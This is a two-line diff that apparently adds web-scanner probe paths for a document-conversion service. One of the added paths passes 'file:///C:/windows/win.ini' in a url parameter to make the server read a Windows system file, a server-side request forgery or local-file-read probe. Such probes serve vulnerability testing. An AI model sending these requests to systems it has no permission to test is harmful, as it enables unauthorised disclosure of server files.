@@ -1,0 +1,2 @@
+/html/2word?url={{file}}
+/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name={{file}}.txt
